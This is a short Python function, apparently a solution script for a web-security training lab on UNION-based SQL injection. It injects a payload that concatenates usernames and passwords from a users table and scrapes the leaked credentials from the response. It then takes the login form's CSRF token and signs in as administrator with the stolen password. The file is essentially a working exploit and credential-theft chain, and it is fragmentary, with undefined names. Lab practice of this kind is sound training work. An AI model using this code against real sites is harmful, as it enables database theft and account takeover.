def sqli_union_lab_4(null, index, url):...
"""docstring"""
null[index] = "username || ':' || password FROM users--"
sqli['category'] = f"{' '.join(null)}"
lab4 = api_session.get(url, params=sqli)
html = BeautifulSoup(lab4.text, 'html.parser')
up_combo = [up.contents[0] for up in html(['th'])]
user_pass = dict(up.split(':') for up in up_combo)
url = url.replace('/page', '/login')
lab4 = api_session.get(url)
html = BeautifulSoup(lab4.text, 'html.parser')
csrfToken = html.find('input', {'name': 'csrf'})['value']
payload = {'username': 'administrator', 'password': user_pass[
    'administrator'], 'csrf': csrfToken}
lab4 = api_session.post(url, data=payload)
return lab4
